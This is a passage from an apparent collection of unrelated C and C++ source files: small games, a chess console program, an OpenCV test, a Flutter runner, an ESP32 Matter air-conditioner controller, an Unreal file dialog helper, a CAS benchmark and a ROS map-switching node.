\"dst2\", img );\n    showImg( \"dst22\", imageIntegralNorm );\n}\n\nint\nmain( )\n{\n    test1( );\n    test2( );\n\n    waitKey( 0 );\n\n    return 0;\n}\n",
    "#include <iostream>\n#include <string>\n#include <cstdlib>\n#include <ctime>\n#include <cctype>\n\nstd::string mBoard[64] = {\n    \"@\", \"$\", \"!\", \"%\", \"&\", \"!\", \"$\", \"@\",\n    \"*\", \"*\", \"*\", \"*\", \"*\", \"*\", \"*\", \"*\",\n    \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\",\n    \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\",\n    \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\",\n    \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\", \"#\",\n    \"*\", \"*\", \"*\", \"*\", \"*\", \"*\", \"*\", \"*\",\n    \"@\", \"$\", \"!\", \"%\", \"&\", \"!\", \"$\", \"@\"\n};\n\nvoid printIntroduction() {\n    std::cout << \"ChessDollPlus\" << std::endl;\n    std::cout << std::endl;\n    std::cout << \"This is a simple representation of a chess board using the ChessDollPlus notation.\" << std::endl;\n    std::cout << \"Each piece is represented by a specific symbol:\" << std::endl;\n    std::cout << std::endl;\n    std::cout << \"@ = Rook (Tower)\" << std::endl;\n    std::cout << \"$ = Knight (Horse)\" << std::endl;\n    std::cout << \"! = Bishop\" << std::endl;\n    std::cout << \"% = King\" << std::endl;\n    std::cout << \"& = Queen\" << std::endl;\n    std::cout << \"* = Pawn\" << std::endl;\n    std::cout << \"# = Empty\" << std::endl;\n    std::cout << std::endl;\n    std::cout << \"The board is an 8x8 grid, with coordinates from A1 to H8.\" << std::endl;\n    std::cout << \"The initial setup of the board is displayed below, with pieces\" << std::endl;\n    std::cout << \"positioned as they would be at the start of a standard chess game.\" << std::endl;\n    std::cout << std::endl;\n}\n\nvoid printBoard(const std::string board[]) {\n    std::cout << \"  A B C D E F G H\" << std::endl;\n    for (int i = 0; i < 8; ++i) {\n        std::cout << 8 - i << \" \";\n        for (int j = 0; j < 8; ++j) {\n            std::cout << board[i * 8 + j] << \" \";\n        }\n        std::cout << 8 - i << std::endl;\n    }\n    std::cout << \"  A B C D E F G H\" << std::endl;\n}\n\nint positionToIndex(char column, char row) {\n    int col = column - 'A';\n    int r = 8 - (row - '1' + 1);\n    return r * 8 + col;\n}\n\nbool isValidMove(std::string board[], int from, int to, bool topPlayerTurn) {\n    // Simplified check, just ensures the target is empty or occupied by opponent piece\n    if (from < 0 || from >= 64 || to < 0 || to >= 64) {\n        return false;\n    }\n    if (board[from] == \"#\") {\n        return false;\n    }\n    // Ensure the player is moving their own piece\n    if ((topPlayerTurn && islower(board[from][0])) || (!topPlayerTurn && isupper(board[from][0]))) {\n        return false;\n    }\n    return board[to] == \"#\" || islower(board[from][0]) != islower(board[to][0]);\n}\n\nvoid movePiece(std::string board[], int from, int to) {\n    board[to] = board[from];\n    board[from] = \"#\";\n}\n\nbool isKingCaptured(std::string board[], bool topPlayerTurn) {\n    std::string king = topPlayerTurn ? \"%\" : \"&\";\n    for (int i = 0; i < 64; ++i) {\n        if (board[i] == king) {\n            return false;\n        }\n    }\n    return true;\n}\n\nint main() {\n    srand(time(0));\n    printIntroduction();\n    printBoard(mBoard);\n\n    bool topPlayerTurn = rand() % 2 == 0;\n    int turn = 1;\n\n    while (true) {\n        std::cout << turn << \" - \" << (topPlayerTurn ? \"Top\" : \"Bottom\") << \" player: \" << std::endl;\n\n        char fromColumn, toColumn;\n        char fromRow, toRow;\n\n        std::cout << \"Enter move (e.g., E2 E4): \";\n        std::cin >> fromColumn >> fromRow >> toColumn >> toRow;\n\n        int fromIndex = positionToIndex(fromColumn, fromRow);\n        int toIndex = positionToIndex(toColumn, toRow);\n\n        if (isValidMove(mBoard, fromIndex, toIndex, topPlayerTurn)) {\n            movePiece(mBoard, fromIndex, toIndex);\n            printBoard(mBoard);\n\n            if (isKingCaptured(mBoard, topPlayerTurn)) {\n                std::cout << (topPlayerTurn ? \"Bottom\" : \"Top\") << \" player wins!\" << std::endl;\n                break;\n            }\n\n            topPlayerTurn = !topPlayerTurn;\n            turn++;\n        } else {\n            std::cout << \"Invalid move, try again.\" << std::endl;\n        }\n    }\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"week_4\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*\n---------------------------------------------------------------------------\nOpen Asset Import Library (assimp)\n---------------------------------------------------------------------------\n\nCopyright (c) 2006-2022, assimp team\n\nAll rights reserved.\n\nRedistribution and use of this software in source and binary forms,\nwith or without modification, are permitted provided that the following\nconditions are met:\n\n* Redistributions of source code must retain the above\ncopyright notice, this list of conditions and the\nfollowing disclaimer.\n\n* Redistributions in binary form must reproduce the above\ncopyright notice, this list of conditions and the\nfollowing disclaimer in the documentation and/or other\nmaterials provided with the distribution.\n\n* Neither the name of the assimp team, nor the names of its\ncontributors may be used to endorse or promote products\nderived from this software without specific prior\nwritten permission of the assimp team.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n\"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\nLIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR\nA PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\nOWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\nSPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT\nLIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\nDATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\nTHEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\nOF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n---------------------------------------------------------------------------\n*/\n#include \"MathTest.h\"\n\nnamespace Assimp {\n\n// Initialize epsilon value.\nconst float AssimpMathTest::Epsilon = Math::getEpsilon<float>();\n\n// Initialize with an interval of [1,100].\nRandomUniformFloatGenerator AssimpMathTest::RandNonZero(1.0f, 100.0f);\n\n// Initialize with an interval of [-PI,PI] inclusively.\nRandomUniformFloatGenerator AssimpMathTest::RandPI(-Math::aiPi<float>(), Math::aiPi<float>());\n\n}\n",
    "/*\nQUESTION CLARIFICATION QUESTION-->\n    The apples available do not allow for an exact proportional distribution based on the amount paid. For example, if the apples cannot be divided in a way that matches the proportions exactly due to their discrete weights.\n    Eg Apples - 200g 300g 100g 500g\n    Lets just say Ram needs 500g\n    Sham needs 300g\n    Rahim needs 150g\n    what to do in this condition as we can see Rahim's needs can't be fullfilled even though we have 300g of apples left?\n\n\n    Individual person's targetWeight can be in decimals so I took double as data type\n\n\nAPPROACH-->\n    First we calculate the totalWeight of apples.\n    Then we calculate the individual person's apple needs -> totalWeight * (there percentage)/100\n    Then we store the apples weight and there frequency inside of a hashmap\n    Then we iterate in the hashmap, and keep on incrementing the each person's desired weight if it is present in the hashmap(there could be a case if no desired amount of apples are present in the map)\n    Now we can decrement the frequency of that apple inside of the hashmap as we have used it.\n\nSOURCES-->\n    there is a similar question on gfg which I have solved earlier so I used that approach here\n    https://www.geeksforgeeks.org/find-number-currency-notes-sum-upto-given-amount/\n\n */\n\n#include <bits/stdc++.h>\n\nusing namespace std;\n\nstruct Person\n{\n    string name;\n    double proportion;\n    vector<int> apples;\n};\n\nint main()\n{\n    vector<int> appleWeights;\n    int weight;\n\n    // Input weights of apples\n    cout << \"Enter apple weight in gram (-1 to stop) : \";\n    while (cin >> weight && weight != -1)\n    {\n        appleWeights.push_back(weight);\n        cout << \"Enter apple weight in gram (-1 to stop) : \";\n    }\n\n    // Calculate total weight\n    double totalWeight = 0;\n    unordered_map<int, int> weightFrequency;\n    for (int w : appleWeights)\n    {\n        totalWeight += w;\n        weightFrequency[w]++;\n    }\n\n    // Define people with their contributions\n    vector<Person> people = {\n        {\"Ram\", 50 / 100.0, {}},\n        {\"Sham\", 30 / 100.0, {}},\n        {\"Rahim\", 20 / 100.0, {}}};\n\n    // Distribute apples based on proportion\n    for (auto &person : people)\n    {\n        double targetWeight = totalWeight * person.proportion;\n\n        for (auto it = weightFrequency.begin(); it != weightFrequency.end();)\n        {\n            if (targetWeight <= 0 || it->second == 0)\n            {\n                ++it;\n                continue;\n            }\n\n            if (it->first <= targetWeight)\n            {\n                person.apples.push_back(it->first);\n                targetWeight -= it->first;\n                it->second--;\n            }\n            else\n            {\n                ++it;\n            }\n        }\n    }\n\n    // Output the result\n    cout << \"Distribution Result:\\n\";\n    for (const auto &person : people)\n    {\n        cout << person.name << \" : \";\n        for (int i = 0; i < person.apples.size(); ++i)\n        {\n            cout << person.apples[i];\n            if (i != person.apples.size() - 1)\n                cout << \", \";\n        }\n        cout << endl;\n    }\n\n    return 0;\n}\n",
    "/* The main file which runs the game */\n\n#include <SFML/Graphics.hpp>\n#include <SFML/Window.hpp>\n#include <iostream>\n#include \"Stats.h\"\n#include \"Display.h\"\n#include \"MainMenu.h\"\n#include \"Gameplay.h\"\n#include \"Entity.h\"\n#include \"Player.h\"\n#include \"Enemy.h\"\n#include \"Projectile.h\"\n#include <string>\n#include <vector>\n#include <ctime>\n\nint main() {\n\n    int timeNow = time(0);\n\n    int windowWidth = 1000;\n    int windowHeight = 1000;\n\n    int menuCount = 0;\n\n    sf::RenderWindow window(sf::VideoMode(windowWidth, windowHeight), \"Game\");\n\n    // Framerate limit\n    window.setFramerateLimit(60);\n\n    sf::View view = window.getDefaultView();\n\n\n    MainMenu myMenu(windowWidth, windowHeight, window);\n    Gameplay myMode(windowWidth, windowHeight, window);\n\n    int screenWidth = sf::VideoMode::getDesktopMode().width;\n    int screenHeight = sf::VideoMode::getDesktopMode().height;\n\n    int windowXPosition = (screenWidth / 2) - (windowWidth / 2);\n    int windowYPosition = (screenHeight / 2) - (windowHeight / 2);\n\n    sf::Vector2i windowNewPos = {windowXPosition, windowYPosition};\n\n    window.setPosition(windowNewPos);\n\n    while (window.isOpen())\n    {\n        sf::Event event;\n        while (window.pollEvent(event))\n        {\n            \n            switch (event.type) {\n                case sf::Event::KeyReleased :\n                    \n                    // Key Press Detection\n                    switch (event.key.code) {\n                        case sf::Keyboard::W:\n                            myMenu.upSelect();\n                            break;\n                        case sf::Keyboard::Up:\n                            myMenu.upSelect();\n                            break;\n                        case sf::Keyboard::S:\n                            myMenu.downSelect();\n                            break;\n\n                        case sf::Keyboard::Down:\n                            myMenu.downSelect();\n                            break;     \n                        case sf::Keyboard::Enter:\n                            myMenu.setSelectedCount(1);\n                            if (myMenu.selected() == 0) {\n                                std::cout << \"Start button was selected\" << std::endl;\n                            } else if (myMenu.selected() == 1) {\n                                std::cout << \"Exit was pressed\" << std::endl;\n                                event.type = sf::Event::Closed;\n                            }\n                            break;\n                        case sf::Keyboard::Escape:\n                            std::cout << \"Escape pressed\" << std::endl;\n                            menuCount = myMenu.getSelectedCount();\n                            \n                            if (menuCount == 0) {\n                                event.type = sf::Event::Closed;\n                            } else {\n                                myMode.setScore(0);\n                            }\n                            \n                            myMenu.setSelectedCount(menuCount - 1);\n                            break;\n\n                        case sf::Keyboard::D:\n                            break;\n                        case sf::Keyboard::A:\n                            break;\n                        default:\n                            myMode.invalidKey(window);\n                            break;                          \n                    }\n\n                default:\n                    break;\n            }\n\n            // Closes window\n            if (event.type == sf::Event::Closed) {\n                window.close();\n            }\n            if (event.type == sf::Event::Resized) {\n                view.setSize({\n                    static_cast<float>(event.size.width),\n                    static_cast<float>(event.size.height)\n                });\n                window.setView(view);\n            }\n\n\n            // Clearing window\n            window.clear();\n\n\n            // Drawing window\n            if (myMenu.getSelectedCount() == 0) {\n                myMenu.drawMenu(window);\n            } else if (myMenu.getSelectedCount() == 1) {\n\n                int timeOld = timeNow;\n\n                timeNow = time(0);\n\n                int deltaTime = timeNow - timeOld;\n\n                myMode.drawMenu(window);\n                \n                myMode.getPlayer()->shoot(window, event);\n                \n                if(deltaTime >= 1) {\n                    myMode.addEnemy();\n                }\n\n                myMode.getPlayer()->move(window);\n                myMode.enemyDefeated(window);\n            } else {\n                event.type = sf::Event::Closed;\n            }\n\n\n            // Displaying window\n            window.display();\n\n\n        }\n    }\n    return 0;\n}",
    "/*\n   This example code is in the Public Domain (or CC0 licensed, at your option.)\n\n   Unless required by applicable law or agreed to in writing, this\n   software is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR\n   CONDITIONS OF ANY KIND, either express or implied.\n*/\n\n#include <esp_err.h>\n#include <esp_log.h>\n#include <nvs_flash.h>\n\n#include <freertos/FreeRTOS.h>\n#include <freertos/task.h>\n#include <freertos/queue.h>\n\n#define EXAMPLE_IR_RESOLUTION_HZ     1000000 // 1MHz resolution, 1 tick = 1us\n#define EXAMPLE_IR_TX_GPIO_NUM       5\n\n#include \"driver/rmt_tx.h\"\n#include \"driver/rmt_rx.h\"\n#include \"ir_nec_encoder.h\"\n#include \"ir_sharpac_encoder.h\"\n\n#include <esp_matter.h>\n#include <esp_matter_console.h>\n#include <esp_matter_ota.h>\n\n#include <app_priv.h>\n#include <app_reset.h>\n#if CHIP_DEVICE_CONFIG_ENABLE_THREAD\n#include <platform/ESP32/OpenthreadLauncher.h>\n#endif\n\n#include <app/server/CommissioningWindowManager.h>\n#include <app/server/Server.h>\n\nstatic const char *TAG = \"app_main\";\nuint16_t light_endpoint_id = 0;\n\nusing namespace esp_matter;\nusing namespace esp_matter::attribute;\nusing namespace esp_matter::endpoint;\nusing namespace chip::app::Clusters;\n\nconstexpr auto k_timeout_seconds = 300;\n\n#if CONFIG_ENABLE_ENCRYPTED_OTA\nextern const char decryption_key_start[] asm(\"_binary_esp_image_encryption_key_pem_start\");\nextern const char decryption_key_end[] asm(\"_binary_esp_image_encryption_key_pem_end\");\n\nstatic const char *s_decryption_key = decryption_key_start;\nstatic const uint16_t s_decryption_key_len = decryption_key_end - decryption_key_start;\n#endif // CONFIG_ENABLE_ENCRYPTED_OTA\n\nrmt_tx_channel_config_t tx_channel_cfg;\nrmt_channel_handle_t tx_channel;\nrmt_carrier_config_t carrier_cfg;\nrmt_transmit_config_t transmit_config;\n\nrmt_encoder_handle_t nec_encoder;\nrmt_encoder_handle_t sharpac_encoder;\n\n#define MATTER_AC_TYPE_POWER_OFF 0\n#define MATTER_AC_TYPE_COOLING 3\n#define MATTER_AC_TYPE_HEATING 4\n\nint16_t currentTargetTemp = 26;\nuint8_t currentTypeInfo = MATTER_AC_TYPE_POWER_OFF;\n\nstatic void app_event_cb(const ChipDeviceEvent *event, intptr_t arg)\n{\n    switch (event->Type) {\n    case chip::DeviceLayer::DeviceEventType::kInterfaceIpAddressChanged:\n        ESP_LOGI(TAG, \"Interface IP Address changed\");\n        break;\n\n    case chip::DeviceLayer::DeviceEventType::kCommissioningComplete:\n        ESP_LOGI(TAG, \"Commissioning complete\");\n        break;\n\n    case chip::DeviceLayer::DeviceEventType::kFailSafeTimerExpired:\n        ESP_LOGI(TAG, \"Commissioning failed, fail safe timer expired\");\n        break;\n\n    case chip::DeviceLayer::DeviceEventType::kCommissioningSessionStarted:\n        ESP_LOGI(TAG, \"Commissioning session started\");\n        break;\n\n    case chip::DeviceLayer::DeviceEventType::kCommissioningSessionStopped:\n        ESP_LOGI(TAG, \"Commissioning session stopped\");\n        break;\n\n    case chip::DeviceLayer::DeviceEventType::kCommissioningWindowOpened:\n        ESP_LOGI(TAG, \"Commissioning window opened\");\n        break;\n\n    case chip::DeviceLayer::DeviceEventType::kCommissioningWindowClosed:\n        ESP_LOGI(TAG, \"Commissioning window closed\");\n        break;\n\n    case chip::DeviceLayer::DeviceEventType::kFabricRemoved:\n        {\n            ESP_LOGI(TAG, \"Fabric removed successfully\");\n            if (chip::Server::GetInstance().GetFabricTable().FabricCount() == 0)\n            {\n                chip::CommissioningWindowManager & commissionMgr = chip::Server::GetInstance().GetCommissioningWindowManager();\n                constexpr auto kTimeoutSeconds = chip::System::Clock::Seconds16(k_timeout_seconds);\n                if (!commissionMgr.IsCommissioningWindowOpen())\n                {\n                    /* After removing last fabric, this example does not remove the Wi-Fi credentials\n                     * and still has IP connectivity so, only advertising on DNS-SD.\n                     */\n                    CHIP_ERROR err = commissionMgr.OpenBasicCommissioningWindow(kTimeoutSeconds,\n                                                    chip::CommissioningWindowAdvertisement::kDnssdOnly);\n                    if (err != CHIP_NO_ERROR)\n                    {\n                        ESP_LOGE(TAG, \"Failed to open commissioning window, err:%\" CHIP_ERROR_FORMAT, err.Format());\n                    }\n                }\n            }\n        break;\n        }\n\n    case chip::DeviceLayer::DeviceEventType::kFabricWillBeRemoved:\n        ESP_LOGI(TAG, \"Fabric will be removed\");\n        break;\n\n    case chip::DeviceLayer::DeviceEventType::kFabricUpdated:\n        ESP_LOGI(TAG, \"Fabric is updated\");\n        break;\n\n    case chip::DeviceLayer::DeviceEventType::kFabricCommitted:\n        ESP_LOGI(TAG, \"Fabric is committed\");\n        break;\n    default:\n        break;\n    }\n}\n\nstatic esp_err_t app_identification_cb(identification::callback_type_t type, uint16_t endpoint_id, uint8_t effect_id,\n                                       uint8_t effect_variant, void *priv_data)\n{\n    ESP_LOGI(TAG, \"Identificati",
    "#include \"WindowsFileDialogBPLibrary.h\"\n#include \"WindowsFileDialog.h\"\n\n#if PLATFORM_WINDOWS\n#include \"Windows/AllowWindowsPlatformTypes.h\"    // allows the use of Windows-specific data types\n#include <commdlg.h>                              //\n#include \"Windows/HideWindowsPlatformTypes.h\"     // hides the Windows-specific data types included by the previous header file. This is done to prevent conflicts with Unreal Engine's data types.\n#endif\n\nUWindowsFileDialogBPLibrary::UWindowsFileDialogBPLibrary(const FObjectInitializer& ObjectInitializer)\n    : Super(ObjectInitializer)\n{\n\n}\n\nFString UWindowsFileDialogBPLibrary::OpenFileDialog(const FString& DefaultPath, const FString& DefaultFileName)\n{\n#if PLATFORM_WINDOWS\n\n    // The sz prefix stands for \"string zero-terminated\", which means that the string is null-terminated, i.e., it ends with a null character ('\\0').\n    // OPENFILENAME is a structure defined in the Windows API that contains information about the file open dialog box.\n    TCHAR szFile[MAX_PATH] = { 0 };                                      \n    OPENFILENAME OpenFileName = { 0 };                                   \n\n    // Setting lStructSize to the size of the OPENFILENAME structure ensures that the GetOpenFileName function can properly read and interpret the structure. \n    // If you omit this line, the GetOpenFileName function may not work correctly, or it may crash.\n    OpenFileName.lStructSize = sizeof(OpenFileName);          \n \n    OpenFileName.hwndOwner = NULL;               // It means that the file open dialog box will have no owner window.\n    OpenFileName.lpstrFile = szFile;             // store the path of the selected file.\n    OpenFileName.nMaxFile = MAX_PATH;            // maximum length of a file path.\n \n    FString InitialDirectory = *DefaultPath;\n    if (InitialDirectory.IsEmpty()) \n        InitialDirectory = FPaths::ProjectDir();\n    \n    // For this to work on Windows, forward slashes must be replaced by backslashes\n    InitialDirectory.ReplaceCharInline(TEXT('/'), TEXT('\\\\'));\n    OpenFileName.lpstrInitialDir = *InitialDirectory;\n    \n    // default file name to be displayed in the file open dialog box (when saving).\n    OpenFileName.lpstrFileTitle = (LPWSTR)TCHAR_TO_WCHAR(DefaultFileName.GetCharArray().GetData());     \n    \n    // OFN_PATHMUSTEXIST - user must select a valid path\n    // OFN_FILEMUSTEXIST - user must select a valid file\n    // OFN_NOCHANGEDIR   - file open dialog box will not change the current directory\n    OpenFileName.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST | OFN_NOCHANGEDIR;                   \n\n    if (GetOpenFileName(&OpenFileName))\n    {\n        return FString(szFile);\n    }\n#endif\n    return FString();\n}",
    "#include <atomic>\n#include <iostream>\n#include <thread>\n\n#include <benchmark/benchmark.h>\n\n#include \"init.hpp\"\n#include \"numa.hpp\"\n\nstd::atomic<bool> flag;\n\nauto BM_CoreCas = [](benchmark::State& state, int cpu0, int cpu1) {\n\n  if (state.thread_index() == 0) {\n    numa::bind_thread_cpu(cpu0);\n  } else {\n    numa::bind_thread_cpu(cpu1);\n  }\n\n\n  // reset state\n  if (state.thread_index() == 0) {\n    flag.store(false, std::memory_order_release);\n  }\n\n  for (auto _ : state) {\n    if (state.thread_index() == 0) {\n        bool exp = false;\n        while(!flag.compare_exchange_strong(exp, true, std::memory_order_relaxed,std::memory_order_relaxed)) {}\n    } else {\n        bool exp = true;\n        while(!flag.compare_exchange_strong(exp, false, std::memory_order_relaxed,std::memory_order_relaxed)) {}\n    }\n  }\n\n\n  if (state.thread_index() == 0) {\n    state.counters[\"cpu0\"] = cpu0;\n    state.counters[\"cpu1\"] = cpu1;\n    state.counters[\"latency\"] = benchmark::Counter(2*state.iterations(), benchmark::Counter::kIsRate | benchmark::Counter::kInvert);\n  }\n  numa::bind_thread_all_cpus();\n};\n\n\nstatic void registerer() {\n\n  std::vector<int> cpus = numa::all_cpus();\n\n  for (size_t i = 0; i < cpus.size(); ++i) {\n    for (size_t j = i; j < cpus.size(); ++j) {\n      int cpu0 = cpus[i];\n      int cpu1 = cpus[j];\n\n      std::string name = std::string(\"BM_CoreCas\")\n      + \"/\" + std::to_string(cpu0)\n      + \"/\" + std::to_string(cpu1);\n\n      benchmark::RegisterBenchmark(\n        name.c_str(),\n        BM_CoreCas,\n        cpu0, cpu1\n      )->Threads(2)->UseRealTime();\n    }\n  }\n\n}\n\nLB_ON_INIT(registerer, \"BM_CoreCas\");\n\n",
    "#include \"map_changer/map_changer_node.h\"\n\nnamespace map_changer {\n\nmap_changer_node::map_changer_node() : pnh_(\"~\")\n{\n    ROS_INFO(\"Start map_changer_node\");\n    pnh_.param(\"wait_time\", wait_time_, 10.0);\n    read_yaml();\n    wp_sub_ = nh_.subscribe(\"/waypoint_manager/waypoint\", 1, &map_changer_node::cb_wp, this);\n    result_sub_ = nh_.subscribe(\"/move_base/result\", 1, &map_changer_node::cb_result, this);\n    next_wp_srv_ = nh_.serviceClient<std_srvs::Trigger>(\"/waypoint_manager/waypoint_server/next_waypoint\");\n    map_srv_ = nh_.serviceClient<nav_msgs::LoadMap>(\"/change_map\");\n    costmap_srv_ = nh_.serviceClient<nav_msgs::LoadMap>(\"/change_map_for_costmap\");\n    pose_pub_ = nh_.advertise<geometry_msgs::PoseWithCovarianceStamped>(\"/initialpose\", 1, this);\n}\n\nmap_changer_node::~map_changer_node()\n{\n}\n\nvoid map_changer_node::cb_wp(const waypoint_manager_msgs::Waypoint::ConstPtr &msg)\n{\n    wp_ = msg;\n    static waypoint_manager_msgs::Waypoint old_wp;\n    if (*msg != old_wp)\n    {\n        new_goal_ = true;\n    }else\n    {\n        new_goal_ = false;\n    }\n    old_wp = *msg;\n}\n\nvoid map_changer_node::cb_result(const move_base_msgs::MoveBaseActionResult::ConstPtr &msg)\n{\n    if (!wp_)\n    {\n        return;\n    }\n\n    static std::string old_id;\n    if (msg->status.status == 3)\n    {\n        for (auto itr = config_list_.begin(); itr != config_list_.end(); ++itr)\n        {\n            std::array<std::string, 2>& config = *itr;\n            if (config[0] == wp_->identity && config[0] == old_id)\n            {\n                ROS_INFO(\"Waiting for %.1f second\", wait_time_);\n                ros::Duration(wait_time_).sleep();\n                call_next_wp();\n                reach_goal_ = true;\n                index_ = std::distance(config_list_.begin(), itr);\n            }\n        }\n    }\n    old_id = wp_->identity;\n}\n\nvoid map_changer_node::loop()\n{\n    if (!wp_)\n    {\n        return;\n    }\n\n    if (reach_goal_ && new_goal_)\n    {\n        send_emclpose(wp_->pose);\n        send_map(index_);\n        send_initialpose(wp_->pose);\n        reach_goal_ = false;\n        new_goal_ = false;\n    }\n}\n\nvoid map_changer_node::read_yaml()\n{\n    try\n    {\n        pnh_.param(\"file_path\", file_path_, std::string(ros::package::getPath(\"map_changer\") += \"/config/test1.yaml\"));\n        ROS_INFO(\"Load %s\", file_path_.c_str());\n        YAML::Node config = YAML::LoadFile(file_path_);\n        for (const auto& node:config[\"config\"])\n        {\n            std::array<std::string, 2> tmp;\n            tmp[0] = node[\"waypoint_id\"].as<std::string>();\n            tmp[1] = node[\"map_file\"].as<std::string>();\n            config_list_.push_back(tmp);\n        }\n    }\n    catch(const std::exception& e)\n    {\n        ROS_ERROR(\"%s\", e.what());\n    }\n}\n\nvoid map_changer_node::call_next_wp()\n{\n    std_srvs::Trigger srv;\n    try\n    {\n        next_wp_srv_.call(srv);\n        ROS_INFO(\"Call service : /next_waypoint\");\n    }\n    catch(const ros::Exception& e)\n    {\n        ROS_ERROR(\"%s\", e.what());\n    }\n    catch(const std::exception& e)\n    {\n        ROS_ERROR(\"%s\", e.what());\n    }\n}\n\nvoid map_changer_node::send_map(int index)\n{\n    nav_msgs::LoadMap map, costmap;\n    map.request.map_url = config_list_[index][1] + \".yaml\";\n    costmap.request.map_url = config_list_[index][1] + \"_for_costmap.yaml\";\n    try\n    {\n        map_srv_.call(map);\n        ROS_INFO(\"Map change to %s\", map.request.map_url.c_str());\n    }\n    catch(const ros::Exception& e)\n    {\n        ROS_ERROR(\"%s\", e.what());\n    }\n    catch(const std::exception& e)\n    {\n        ROS_ERROR(\"%s\", e.what());\n    }\n\n    try\n    {\n        costmap_srv_.call(costmap);\n        ROS_INFO(\"Costmap change to %s\", costmap.request.map_url.c_str());\n    }\n    catch(const ros::Exception& e)\n    {\n        ROS_ERROR(\"%s\", e.what());\n    }\n    catch(const std::exception& e)\n    {\n        ROS_ERROR(\"%s\", e.what());\n    }\n}\n\nvoid map_changer_node::send_emclpose(geometry_msgs::Pose pose)\n{\n    double roll = 0, pitch = 0, yaw = 0;\n    tf::Quaternion quat;\n    quaternionMsgToTF(pose.orientation, quat);\n    tf::Matrix3x3(quat).getRPY(roll, pitch, yaw);\n    nh_.setParam(\"/emcl2_node/initial_pose_x\", pose.position.x);\n    nh_.setParam(\"/emcl2_node/initial_pose_y\", pose.position.y);\n    nh_.setParam(\"/emcl2_node/initial_pose_y\", yaw);\n}\n\nvoid map_changer_node::send_initialpose(geometry_msgs::Pose pose)\n{\n    geometry_msgs::PoseWithCovarianceStamped msg;\n    msg.pose.pose = pose;\n    pose_pub_.publish(msg);\n    ROS_INFO(\"Teleport to x:%lf, y:%lf\", pose.position.x, pose.position.y);\n}\n}\n\nint main(int argc, char **argv)\n{\n    ros::init(argc, argv, \"map_changer_node\");\n    map_changer::map_changer_node mc;\n    ros::Rate rate(10);\n    while (ros::ok())\n    {\n        ros::spinOnce();\n        mc.loop();\n        rate.sleep();\n    }\n    return 0;\n}",
    "#include \"Dependencies.h\"\n\nconst int CountOfSym = 109;\n\nint charPos = (CountOfSym / 2 - 5);\t\t\t\t\t\t\t//start initializer of position of character\nint prevPos;\nint positionEntity;\nint previousPositionEnemy;\nint score;\n\nchar GameCharacter = '@';\nchar Enemy = '&';\n\nconst std::string arrMessages[10] = { \"invalid input\", \"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\"}; //array of messages for unexpected situations\n\nchar arrGameField[CountOfSym] =\t\t\t\t\t\t\t\t// main array of gamefield symbols\n{\n\t'#', '#', '#', '#', '#', '#', '#', '#', '#', '#', '\\n',\n\t'#', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', '#', '\\n',\n\t'#', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', '#', '\\n',\n\t'#', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', '#', '\\n',\n\t'#', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', '#', '\\n',\n\t'#', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', '#', '\\n',\n\t'#', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', '#', '\\n',\n\t'#', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', '#', '\\n',\n\t'#', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', '#', '\\n',\n\t'#', '#', '#', '#', '#', '#', '#', '#', '#', '#', \n};\n\n\nvoid drawField() {\n\n\tfor (int i = 0; i < CountOfSym; i++) {\n\t\tstd::cout << arrGameField[i];\n\t}\n\n}\n\nvoid inputHandler() {\n\n\tchar action;\n\n\tstd::cin >> action;\n\n\tif (action == 'w') {\t\t\t\t\t\t\t// handler for check action for input chars\n\t\tcharPos = charPos - 11;\n\n\t}\n\telse if (action == 's') 